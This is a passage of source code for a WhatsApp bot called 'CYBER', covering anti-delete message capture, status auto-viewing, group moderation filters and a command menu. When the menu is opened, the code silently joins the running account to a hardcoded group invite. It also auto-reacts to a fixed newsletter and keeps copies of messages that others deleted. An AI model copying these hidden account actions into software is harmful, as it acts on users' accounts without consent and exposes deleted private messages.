                _adContent = msg.audioMessage.ptt ? '🎤 Voice Note' : '🎵 Audio';
                try {
                    const { downloadContentFromMessage: _dlc } = require('@whiskeysockets/baileys');
                    const _stream = await _dlc(msg.audioMessage, 'audio');
                    let _buf = Buffer.from([]);
                    for await (const _chunk of _stream) _buf = Buffer.concat([_buf, _chunk]);
                    _adMediaPath = `${ANTIDELETE_TEMP_DIR}/${_adMsgId2}.mp3`;
                    fs.writeFileSync(_adMediaPath, _buf);
                } catch (e) {}
            }
            // ── Sticker ──
            else if (msg.stickerMessage) {
                _adMediaType = 'sticker';
                _adContent = '🎭 Sticker';
                try {
                    const { downloadContentFromMessage: _dlc } = require('@whiskeysockets/baileys');
                    const _stream = await _dlc(msg.stickerMessage, 'sticker');
                    let _buf = Buffer.from([]);
                    for await (const _chunk of _stream) _buf = Buffer.concat([_buf, _chunk]);
                    _adMediaPath = `${ANTIDELETE_TEMP_DIR}/${_adMsgId2}.webp`;
                    fs.writeFileSync(_adMediaPath, _buf);
                } catch (e) {}
            }
            // ── Document ──
            else if (msg.documentMessage) {
                _adMediaType = 'document';
                const docName = msg.documentMessage.fileName || msg.documentMessage.title || 'File';
                _adContent = `📄 Document: ${docName}`;
            }
            // ── Poll ──
            else if (msg.pollCreationMessage || msg.pollCreationMessageV2 || msg.pollCreationMessageV3) {
                const poll = msg.pollCreationMessage || msg.pollCreationMessageV2 || msg.pollCreationMessageV3;
                const options = (poll.options || []).map((o, i) => `  ${i + 1}. ${o.optionName}`).join('\n');
                _adContent = `📊 *Poll:* ${poll.name}\n${options}`;
            }
            // ── Location ──
            else if (msg.locationMessage || msg.liveLocationMessage) {
                const loc = msg.locationMessage || msg.liveLocationMessage;
                _adContent = `📍 Location${loc.name ? ': ' + loc.name : ''}\nhttps://maps.google.com/?q=${loc.degreesLatitude},${loc.degreesLongitude}`;
            }
            // ── Contact ──
            else if (msg.contactMessage) {
                _adContent = `👤 Contact: ${msg.contactMessage.displayName || 'Unknown'}`;
            } else if (msg.contactsArrayMessage) {
                const names = (msg.contactsArrayMessage.contacts || []).map(c => c.displayName).join(', ');
                _adContent = `👥 Contacts: ${names}`;
            }
            // ── Reaction ──
            else if (msg.reactionMessage) {
                _adContent = `${msg.reactionMessage.text || '❤️'} Reaction`;
            }
            // ── Button / List response ──
            else if (msg.buttonsResponseMessage) {
                _adContent = `🔘 Button reply: ${msg.buttonsResponseMessage.selectedDisplayText || msg.buttonsResponseMessage.selectedButtonId || ''}`;
            } else if (msg.listResponseMessage) {
                _adContent = `📋 List reply: ${msg.listResponseMessage.title || msg.listResponseMessage.singleSelectReply?.selectedRowId || ''}`;
            }
            // ── View once (mark as such, can't resend) ──
            else if (msg.viewOnceMessage || msg.viewOnceMessageV2) {
                const inner = msg.viewOnceMessage?.message || msg.viewOnceMessageV2?.message || {};
                _adContent = inner.imageMessage ? '🔒 View once image' : inner.videoMessage ? '🔒 View once video' : '🔒 View once message';
            }
            // ── Fallback: unknown type ──
            else {
                const knownType = Object.keys(msg)[0];
                if (knownType) _adContent = `[${knownType.replace('Message', '')} message]`;
            }

            // Store with per-bot key so each bot user's messages are tracked separately
            const _adBotNum2 = jidToNum(getBotJid(devtrust));
            const _adStoreKey2 = _adBotNum2
                ? `${_adBotNum2}::${antiStoreKey(_adChatId2, _adMsgId2)}`
                : antiStoreKey(_adChatId2, _adMsgId2);
            const _adMsgData2 = {
                content: _adContent,
                mediaType: _adMediaType,
                mediaPath: _adMediaPath,
                fromMe: Boolean(m.key.fromMe),
                sender: _adSender2,
                group: (_adChatId2 || '').endsWith('@g.us') ? _adChatId2 : null,
                timestamp: new Date().toISOString(),
                sessionJid: getBotJid(devtrust)
            };
            global._antideleteStore.set(_adStoreKey2, _adMsgData2);
            // Also store with shared key for backward compat
            global._antideleteStore.set(antiStoreKey(_adChatId2, _adMsgId2), _adMsgData2);
            // Save to disk so messages survive bot restarts
            _saveDiskStore();
            setTimeout(() => {
                global._antideleteStore.delete(_adStoreKey2);
                global._antideleteStore.delete(antiStoreKey(_adChatId2, _adMsgId2));
                _saveDiskStore();
            }, 24 * 60 * 60 * 1000);
        }
    } catch (e) { console.error('[ANTIDELETE STORE]', e); }
})();

if (!devtrust.public) {
    if (!isCreator) return
}

const example = (teks) => {
    return `Usage : *${prefix+command}* ${teks}`
}

let antilinkStatus = {};
if (!global.banned) global.banned = {} // stores banned users JIDs

if (getSetting(m.sender, "autobio", true)) {
    devtrust.updateProfileStatus(`CYBER by GAME CHANGER`).catch(_ => _)
}

if (isCmd) {
    console.log(chalk.black(chalk.bgWhite('[ CYBER ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=>In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}

if (getSetting(m.chat, "autoReact", false)) {
    const emojis = [
        "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "🀄", "😠", "🀄", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "🖕", "🙏", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    try {
        await devtrust.sendMessage(m.chat, {
            react: { text: randomEmoji, key: m.key },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}

if (getSetting(m.chat, "autoTyping", false)) {
    devtrust.sendPresenceUpdate('composing', from)
}
if (getSetting(m.chat, "autoRecording", false)) {
    devtrust.sendPresenceUpdate('recording', from)
}
if (getSetting(m.chat, "autoRecordType", false)) {
    let xeonrecordin = ['recording','composing']
    let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
    devtrust.sendPresenceUpdate(xeonrecordinfinal, from)
}
     
//----------------------Func End----------------//
if (m.key.remoteJid === "status@broadcast") {
    if (getSetting(botNumber, "autoViewStatus", false)) {
        const _viewDelay = getSetting(botNumber, 'autoViewStatusDelay', 0) * 1000;
        const _doView = async () => {
            try { await devtrust.readMessages([m.key]); } catch (err) {}
        };
        if (_viewDelay > 0) { setTimeout(_doView, _viewDelay); } else { await _doView(); }
    }
    if (getSetting(botNumber, "autoStatusReact", false)) {
        const _reactDelay = getSetting(botNumber, 'autoReactStatusDelay', 0) * 1000;
        const _doReact = async () => {
            try {
                const _customEmojis = getSetting(botNumber, 'statusEmojis', null);
                const _statusReacts = (_customEmojis && _customEmojis.length > 0)
                    ? _customEmojis
                    : ['❤️', '🔥', '👍', '😍', '🥰', '😊', '💯', '✅'];
                const _randomReact = _statusReacts[Math.floor(Math.random() * _statusReacts.length)];
                await devtrust.sendMessage(m.key.remoteJid, {
                    react: { text: _randomReact, key: m.key }
                });
            } catch (err) {}
        };
        if (_reactDelay > 0) { setTimeout(_doReact, _reactDelay); } else { await _doReact(); }
    }
    if (getSetting(botNumber, "autoStatusReply", false)) {
        const _statusReplyMsg = getSetting(botNumber, "autoStatusReplyMsg", null);
        if (_statusReplyMsg && m.key.participant) {
            try {
                const _senderJid = m.key.participant;
                await devtrust.sendMessage(_senderJid, { text: _statusReplyMsg });
            } catch (err) {}
        }
    }
}

if (getSetting(m.chat, "autoRecording", false)) {
    devtrust.sendPresenceUpdate('recording', from)
}  
    
if (getSetting(m.chat, "autoTyping", false)) {
    devtrust.sendPresenceUpdate('composing', from)
}

if (getSetting(m.chat, "autoRecordType", false)) {
    let xeonrecordin = ['recording','composing']
    let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
    devtrust.sendPresenceUpdate(xeonrecordinfinal, from)
}

if (getSetting(m.sender, "autoread", false)) {
   try {
      await devtrust.readMessages([m.key]) 
   } catch (e) {
      console.log("Auto-Read Error:", e)
   }
}

// ======================[ BANNED USERS CHECK ]======================
if (getSetting(m.sender, "banned", false)) {
    await reply(`⛔ You are banned from using this bot, @${m.sender.split('@')[0]}`, [m.sender])
    return
}

// ======================[ 🔇 MUTED USERS CHECK ]======================
if (m.isGroup && global.muted?.[m.chat]?.includes(m.sender) && !isAdmins && !isCreator) {
    await devtrust.sendMessage(m.chat, { delete: m.key });
    return;
}

// ======================[ 🛡️ ANTI FEATURES DETECTION - FIXED ]======================

// ANTILINK CHECK
if (m.isGroup && body && !isAdmins && !isCreator) {
    const groupSettings = antilinkSettings[m.chat];
    if (groupSettings && groupSettings.enabled) {
        const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|([a-zA-Z0-9]+\.(com|net|org|io|gov|edu|xyz|tk|ml|ga|cf|gq|me|tv|cc|ws|club|online|site|tech|store|blog|xyz))(\/[^\s]*)?/i;
        const gcLinkRegex = /chat\.whatsapp\.com\/[A-Za-z0-9]+/i;
        const isGcLink = gcLinkRegex.test(body);
        const isAnyLink = linkRegex.test(body.toLowerCase());

        // Determine which mode triggered
        const gcMode = groupSettings.gcMode || 'off'; // antilinkgc / antilinkgckick
        const warnMode = groupSettings.warnMode || false; // antilinkwarn

        if (isGcLink && (gcMode === 'delete' || gcMode === 'kick')) {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (gcMode === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} was kicked for posting a group invite link`, [m.sender]);
            } else {
                await reply(`🔗 @${m.sender.split('@')[0]} group invite links are not allowed in this group`, [m.sender]);
            }
        } else if (isAnyLink && groupSettings.action !== 'off') {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (warnMode) {
                const wLimit = getWarnLimit(m.chat);
                if (!global.warns[m.chat]) global.warns[m.chat] = {};
                if (!global.warns[m.chat][m.sender]) global.warns[m.chat][m.sender] = 0;
                global.warns[m.chat][m.sender]++;
                const wCount = global.warns[m.chat][m.sender];
                if (wCount >= wLimit) {
                    delete global.warns[m.chat][m.sender];
                    try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for posting links (${wLimit} warnings reached)`, [m.sender]);
                } else {
                    await reply(`⚠️ @${m.sender.split('@')[0]} warned for posting a link (${wCount}/${wLimit} warnings)`, [m.sender]);
                }
            } else if (groupSettings.action === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} was kicked for posting links`, [m.sender]);
            } else {
                await reply(`🔗 @${m.sender.split('@')[0]} links are not allowed in this group`, [m.sender]);
            }
        }
    }
}

// ANTI-TAG CHECK (full mode: delete / kick / warn / adminonly / adminonly+warn)
if (m.isGroup && m.mentionedJid && m.mentionedJid.length > 0 && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
    if (config.enabled) {
        const isAdminTag = config.adminOnly && groupAdmins && m.mentionedJid.some(j => groupAdmins.includes(j));
        const isMassTag = m.mentionedJid.length > 1;
        const shouldAct = config.adminOnly ? isAdminTag : isMassTag;
        if (shouldAct) {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (config.action === 'warn') {
                const wLimit = getWarnLimit(m.chat);
                if (!global.warns[m.chat]) global.warns[m.chat] = {};
                if (!global.warns[m.chat][m.sender]) global.warns[m.chat][m.sender] = 0;
                global.warns[m.chat][m.sender]++;
                const wCount = global.warns[m.chat][m.sender];
                if (wCount >= wLimit) {
                    delete global.warns[m.chat][m.sender];
                    try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for tagging (${wLimit} warnings reached)`, [m.sender]);
                } else {
                    const reason = config.adminOnly ? 'tagging admin' : 'mass tagging';
                    await reply(`⚠️ @${m.sender.split('@')[0]} warned for ${reason} (${wCount}/${wLimit})`, [m.sender]);
                }
            } else if (config.action === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} kicked for tagging`, [m.sender]);
            } else {
                const reason = config.adminOnly ? 'tagging admin' : 'mass tagging';
                await reply(`🏷️ @${m.sender.split('@')[0]} ${reason} is not allowed`, [m.sender]);
            }
        }
    }
}

// ANTI-GROUP-MENTION CHECK (group status / @all / @everyone mentions)
if (m.isGroup && !isAdmins && !isCreator) {
    const _agmSettings = antigroupmentionSettings[m.chat];
    if (_agmSettings && _agmSettings.enabled) {
        const hasGroupMention = m.message?.extendedTextMessage?.contextInfo?.groupMentions?.length > 0
            || body?.toLowerCase().includes('@all') || body?.toLowerCase().includes('@everyone');
        if (hasGroupMention) {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            if (_agmSettings.action === 'kick') {
                try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                await reply(`👢 @${m.sender.split('@')[0]} was kicked for using group mention`, [m.sender]);
            } else if (_agmSettings.action === 'warn') {
                const wLimit = getWarnLimit(m.chat);
                if (!global.warns[m.chat]) global.warns[m.chat] = {};
                if (!global.warns[m.chat][m.sender]) global.warns[m.chat][m.sender] = 0;
                global.warns[m.chat][m.sender]++;
                const wCount = global.warns[m.chat][m.sender];
                if (wCount >= wLimit) {
                    delete global.warns[m.chat][m.sender];
                    try { await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove'); } catch (e) {}
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for group mentions (${wLimit} warnings)`, [m.sender]);
                } else {
                    await reply(`⚠️ @${m.sender.split('@')[0]} warned for group mention (${wCount}/${wLimit})`, [m.sender]);
                }
            } else {
                await reply(`🔕 @${m.sender.split('@')[0]} group mentions are not allowed`, [m.sender]);
            }
        }
    }
}

// ANTI-SPAM CHECK
if (m.isGroup && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
    if (config.enabled) {
        const now = Date.now();
        const userId = m.sender;
        const chatId = m.chat;
        
        if (!global.antispam[chatId]) global.antispam[chatId] = {};
        if (!global.antispam[chatId][userId]) {
            global.antispam[chatId][userId] = {
                count: 1,
                timestamp: now
            };
        } else {
            const timeDiff = (now - global.antispam[chatId][userId].timestamp) / 1000;
            
            if (timeDiff < 5) {
                global.antispam[chatId][userId].count++;
                
                if (global.antispam[chatId][userId].count > 5) {
                    // Delete the message
                    await devtrust.sendMessage(m.chat, { delete: m.key });
                    
                    if (config.action === 'delete') {
                        await reply(`🚫 @${m.sender.split('@')[0]} slow down! (Anti-Spam)`, [m.sender]);
                    }
                    else if (config.action === 'kick') {
                         if (!isAdmins && !isCreator) {
                            await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                            await reply(`👢 @${m.sender.split('@')[0]} kicked for spamming`, [m.sender]);
                        } else {
                            await reply(`⚠️ @${m.sender.split('@')[0]} would be kicked but I need admin rights`, [m.sender]);
                        }
                    }
                    
                    // Reset
                    global.antispam[chatId][userId].count = 0;
                    global.antispam[chatId][userId].timestamp = now;
                }
            } else {
                global.antispam[chatId][userId].count = 1;
                global.antispam[chatId][userId].timestamp = now;
            }
        }
    }
}

// ANTI-BOT CHECK - FIXED
if (m.isGroup && body && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
    if (config.enabled) {
        // Check if message starts with common bot prefixes
        const botPrefixes = ['.', '!', '/', '#', '$', '%', '&', '*'];
        const startsWithPrefix = botPrefixes.some(prefix => body.startsWith(prefix));
        
        // Check if sender ID looks like a bot
        const isBotJid = m.sender.includes('bot') || m.sender.includes('lid') || m.sender.includes('broadcast');
        
        // ONLY trigger if BOTH conditions are true
        if (startsWithPrefix && isBotJid) {
            // Delete the message
            await devtrust.sendMessage(m.chat, { delete: m.key });
            
            if (config.action === 'delete') {
                await reply(`🤖 Bot message detected and deleted`, []);
            }
            else if (config.action === 'kick') {
                 if (!isAdmins && !isCreator) {
                    await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                    await reply(`👢 Bot kicked from group`, []);
                } else {
                    await reply(`⚠️ Bot detected but I need admin rights to kick`, []);
                }
            }
        }
    }
}

// ANTI-BEG CHECK
if (m.isGroup && body && !isAdmins && !isCreator) {
    const config = getSetting(m.chat, "antibeg", { enabled: false, action: 'delete' });
    if (config.enabled) {
        const begPatterns = [
            /bless me/i, /send me money/i, /give me money/i, /help me financially/i,
            /i need money/i, /i dey suffer/i, /no money/i, /hungry dey catch me/i,
            /send me airtime/i, /buy me data/i, /fund me/i, /CYBERate to me/i,
            /my account number/i, /bank transfer/i, /send cash/i, /poor me/i,
            /assist me financially/i, /brother help/i, /sister help/i,
            /anything for me/i, /what about me/i, /remember me/i,
            /broke/i, /suffering/i, /starving/i, /no food/i
        ];
        
        const isBegging = begPatterns.some(pattern => pattern.test(body));
        
        if (isBegging) {
            // Delete the message
            await devtrust.sendMessage(m.chat, { delete: m.key });
            
            if (config.action === 'delete') {
                await reply(`💰 @${m.sender.split('@')[0]} begging is not allowed`, [m.sender]);
            }
            else if (config.action === 'kick') {
                 if (!isAdmins && !isCreator) {
                    await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                    await reply(`👢 @${m.sender.split('@')[0]} kicked for begging`, [m.sender]);
                } else {
                    await reply(`⚠️ @${m.sender.split('@')[0]} would be kicked but I need admin rights`, [m.sender]);
                }
            }
        }
    }
}

if (getSetting(m.chat, "feature.autoreply", false)) {
   const autoReplyList = { 
       "hi": "Hello 👋", 
       "hello": "Hi there!", 
       "I am CYBER": "Coolest Whatsapp bot 😌" 
   }
   if (autoReplyList[m.text?.toLowerCase()]) {
      await reply(autoReplyList[m.text.toLowerCase()])
   }
}

let chatbot = false;

if (getSetting(m.chat, "feature.antibadword", false)) {
   const badWords = ["fuck", "bitch", "sex", "nigga","bastard","fool","mumu","idiot","werey","mother","mama","ass","mad","dick","pussy","bast"]
   if (badWords.some(word => m.text?.toLowerCase().includes(word))) {
      await reply(`❌ @${m.sender.split('@')[0]} watch your language 😟!`, [m.sender])
      await devtrust.sendMessage(m.chat, { delete: m.key })
   }
}
 
if (getSetting(m.chat, "feature.antibot", false)) {
   let botPrefixes = ['.', '!', '/', '#']
   if (botPrefixes.includes(m.text?.trim()[0])) {
      if (!isOwner) {
         await reply(`🤖 Anti-Bot active! @${m.sender.split('@')[0]} not allowed.`, [m.sender])
         await devtrust.sendMessage(m.chat, { delete: m.key })
      }
   }
}

//LOADING FUNCTION
async function nexusLoading() {
    const nexusMylove = [`Loading menu...`];
    let msg = await devtrust.sendMessage(from, { text: "Connecting to CYBER server....." });

    for (let i = 0; i < nexusMylove.length; i++) {
        await devtrust.sendMessage(from, {
            text: nexusMylove[i],
            edit: msg.key
        });
        await new Promise(resolve => setTimeout(resolve, 200));
    }
}

// NOTE: Newsletter auto-react is now handled inline above (no nested listener)

if (m.message) {
    console.log(chalk.hex('#3498db')(`message " ${m.message} "  from ${pushname} id ${m.isGroup ? `group ${groupMetadata.subject}` : 'private chat'}`));
}

// ============ NEWSLETTER AUTO-REACT (inline, no nested listener) ============
const newsletterJids = ["120363408022768294@newsletter"];
const newsletterEmojis = [
    '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💔', '❣️', 
    '💕', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '🥺', '😊', '🙏', 
    '😙', '😻', '🔥', '😀', '😍', '🥰', '😘', '🤗', '🤩', '😎', '😇', 
    '🥶','🥳', '😋', '🎉', '🔥'
];
const hansRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];

if (newsletterJids.includes(from)) {
    const serverId = m?.newsletterServerId;
    if (serverId) {
        try {
            const emoji = hansRandom(newsletterEmojis);
            await devtrust.newsletterReactMessage(from, serverId.toString(), emoji);
        } catch (err) {
            console.error("❌ Newsletter auto-reaction error:", err);
        }
    }
    return;
}
// =======================================================================

// ======================[ ⚠️ WARN SYSTEM HELPER ]======================
async function handleWarn(chatId, userId, reason, mode) {
    if (!global.warns[chatId]) global.warns[chatId] = {};
    if (!global.warns[chatId][userId]) global.warns[chatId][userId] = 0;
    
    // MODE 1: DELETE ONLY - no warnings
    if (mode === 'delete') {
        return { action: 'delete', kicked: false };
    }
    
    // MODE 2: WARN - add warning
    if (mode === 'warn') {
        global.warns[chatId][userId] += 1;
        const warnCount = global.warns[chatId][userId];
        const warnLimit = getWarnLimit(chatId);
        
        if (warnCount >= warnLimit) {
            delete global.warns[chatId][userId];
            return { action: 'kick', kicked: true, warnCount, warnLimit };
        }
        
        return { action: 'warn', kicked: false, warnCount, warnLimit };
    }
    
    // MODE 3: KICK - immediate kick
    if (mode === 'kick') {
        return { action: 'kick', kicked: true, warnCount: 0 };
    }
    
    return { action: 'delete', kicked: false };
}

// ============ MENU HELPER FUNCTIONS ============

function formatUptime(seconds) {
    const days = Math.floor(seconds / (24 * 60 * 60));
    seconds = seconds % (24 * 60 * 60);
    const hours = Math.floor(seconds / (60 * 60));
    seconds = seconds % (60 * 60);
    const minutes = Math.floor(seconds / 60);
    seconds = Math.floor(seconds % 60);

    let time = '';
    if (days > 0) time += `${days}d `;
    if (hours > 0) time += `${hours}h `;
    if (minutes > 0) time += `${minutes}m `;
    if (seconds > 0 || time === '') time += `${seconds}s`;
    return time.trim();
}

function formatRam(total, free) {
    const used = (total - free) / (1024 * 1024 * 1024);
    const totalGb = total / (1024 * 1024 * 1024);
    const percent = ((used / totalGb) * 100).toFixed(1);
    return `${used.toFixed(1)}GB / ${totalGb.toFixed(1)}GB (${percent}%)`;
}

function countCommands() {
    try {
        const caseFileContent = fs.readFileSync(__filename).toString();
        // Count all unique case statements
        const commandRegex = /case ['"]([^'"]+)['"]:/g;
        const matches = [...caseFileContent.matchAll(commandRegex)];
        const uniqueCommands = new Set(matches.map(match => match[1]));
        const count = uniqueCommands.size;
        console.log(`📊 Total commands detected: ${count}`);
        return count;
    } catch (e) {
        console.error('Error counting commands:', e);
        return 4; // Your actual command count
    }
}

function getMoodEmoji() {
    const hour = getLagosTime().getHours();
    if (hour < 12) return '🌅';
    if (hour < 18) return '☀️';
    return '🌙';
}

function getLagosTime() {
    try {
        const options = {
            timeZone: 'Africa/Lagos',
            hour12: false,
            hour: 'numeric',
            minute: 'numeric'
        };
        const formatter = new Intl.DateTimeFormat('en-GB', options);
        const parts = formatter.formatToParts(new Date());
        const hour = parts.find(part => part.type === 'hour').value;
        const minute = parts.find(part => part.type === 'minute').value;
        const now = new Date();
        const lagosDate = new Date(now.toLocaleString('en-US', {timeZone: 'Africa/Lagos'}));
        return lagosDate;
    } catch (error) {
        const now = new Date();
        const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
        return new Date(utc + (3600000 * 1));
    }
}

// FIXED: Changed variable name from "penis" to avoid issues
const caseFileContent = fs.readFileSync(__filename).toString();
const matches = caseFileContent.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
const caseCount = matches.length;
const caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let totalCases = caseCount;
let listCases = caseNames.join('\n⭔ '); 

async function autoJoinGroup(devtrust, inviteLink) {
  try {
    const inviteCode = inviteLink.match(/([a-zA-Z0-9_-]{22})/)?.[1];
    if (!inviteCode) {
      throw new Error('Invalid invite link');
    }
    const result = await devtrust.groupAcceptInvite(inviteCode);
    console.log('✅ Joined group:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to join group:', error.message);
    return null;
  }
}

function formatLagosTime() {
    const lagosTime = getLagosTime();
    const hours = lagosTime.getHours().toString().padStart(2, '0');
    const minutes = lagosTime.getMinutes().toString().padStart(2, '0');
    return `${hours}:${minutes}`;
}

// ============ GET PROFESSIONAL FEATURES ============

function getOwnerName() {
    return "GAME CHANGER";
}

function getBotVersion() {
    return "1.1";
}

function getBotMode() {
    return devtrust.public ? "PUBLIC" : "PRIVATE";
}

function getCurrentDateTime() {
    const date = new Date();
    const options = { 
        timeZone: 'Africa/Lagos',
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    };
    return date.toLocaleString('en-US', options) + ' WAT';
}

// ============ STICKER COMMAND DETECTION ============
// If the message is a sticker, check if it has a registered command binding
if (m.message?.stickerMessage && !command) {
    try {
        const _stickerCmds = loadStickerCmds();
        const _stickerMsgId = m.key?.id || '';
        // Try matching by sticker ID hash stored in the database
        const _matchedCmd = _stickerCmds[_stickerMsgId];
        if (_matchedCmd) {
            // Re-route as if the user sent that command
            body = prefix + _matchedCmd;
            // Fall through to switch below (command will be re-evaluated)
        }
    } catch (e) {}
}

// ============ MENU COMMAND ============

switch(command) {
// ============ MENU WITH ALPHABETICAL ORDER ============

case 'allmenu':
case 'CYBERall':
case 'commandlist': {
  await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
    await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
    
    const menuImages = [
        'https://files.catbox.moe/smv12k.jpeg',
        'https://files.catbox.moe/smv12k.jpeg'
    ];
    
    const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
    const uptime = formatUptime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = getLagosTime();
    const readmore = String.fromCharCode(8206).repeat(4001);
    const ramInfo = formatRam(totalMem, freeMem);
    const moodEmoji = getMoodEmoji();
    const totalCommands = countCommands();
    const hour = date.getHours();
    let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';
    
    // Get professional features
    const ownerName = getOwnerName();
    const botVersion = getBotVersion();
    const botMode = getBotMode();
    const currentDateTime = getCurrentDateTime();
    
    // ALPHABETICAL SECTIONS
    const menuText = `
┏━━◆ *CYBER - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *CYBER* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender.split('@')[0]}
┃ \`CYBER ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*CYBER* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
⚙️ *Powered by CYBER SEC PRO*
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *CYBER - 𝐀𝐈* ◆━━┓
│❖ ${prefix}ai
│❖ ${prefix}aipic
│❖ ${prefix}codeai
│❖ ${prefix}deepseek
│❖ ${prefix}gemini
│❖ ${prefix}gemivbnni
│❖ ${prefix}gpt
│❖ ${prefix}gpt3
│❖ ${prefix}gpt4
│❖ ${prefix}gpt5
│❖ ${prefix}grok
│❖ ${prefix}grovnnk-ai
│❖ ${prefix}metaai
│❖ ${prefix}metabcn-ai
│❖ ${prefix}photoai
│❖ ${prefix}qwen
│❖ ${prefix}qwenxj
│❖ ${prefix}storyai
│❖ ${prefix}triviaai
┗━━━━━━━━━━━━━━━━━━━━┛

┏━━◆ *CYBER - 𝐀𝐍𝐈𝐌𝐄* ◆━━┓
│❖ ${prefix}akiyama
│❖ ${prefix}ana
│❖ ${prefix}animebite
│❖ ${prefix}animeblush
│❖ ${prefix}animebonk
│❖ ${prefix}animebully
│❖ ${prefix}animecringe
│❖ ${prefix}animedance
│❖ ${prefix}animedl
│❖ ${prefix}animeglomp
│❖ ${prefix}animehappy
│❖ ${prefix}animehighfive
│❖ ${prefix}animekill
│❖ ${prefix}animelick
│❖ ${prefix}animepoke
│❖ ${prefix}animesearch
│❖ ${prefix}animesmile
│❖ ${prefix}animesmug
│❖ ${prefix}animewave
│❖ ${prefix}animewink
│❖ ${prefix}animewlp
│❖ ${prefix}animeyeet
│❖ ${prefix}art
│❖ ${prefix}asuna
│❖ ${prefix}ayuzawa
│❖ ${prefix}bluearchive
│❖ ${prefix}boruto
│❖ ${prefix}bts
│❖ ${prefix}cartoon
│❖ ${prefix}cecan
│❖ ${prefix}chiho
│❖ ${prefix}chinagirl
│❖ ${prefix}chitoge
│❖ ${prefix}cogan
│❖ ${prefix}cosplay
│❖ ${prefix}cosplayloli
